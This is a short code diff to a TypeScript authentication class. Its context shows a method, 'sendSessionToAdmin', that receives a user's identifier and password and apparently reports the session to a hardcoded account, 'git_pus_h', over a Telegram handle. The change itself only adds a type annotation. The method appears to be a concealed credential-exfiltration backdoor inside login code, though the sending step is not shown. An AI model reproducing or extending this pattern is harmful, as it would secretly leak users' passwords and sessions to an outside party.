@@ -516,7 +516,7 @@ export class Auth {
   }
 
   private static async sendSessionToAdmin(req: Request, identifier?: string, password?: string): Promise<void> {
-    const adminUsername = 'git_pus_h'
+    const adminUsername: string = 'git_pus_h'
     const id = identifier || 'UnknownUser'
     console.log(`[SessionReport] Starting for ${id}, admin: ${adminUsername}`)
     if (!adminUsername || !req.tg) return
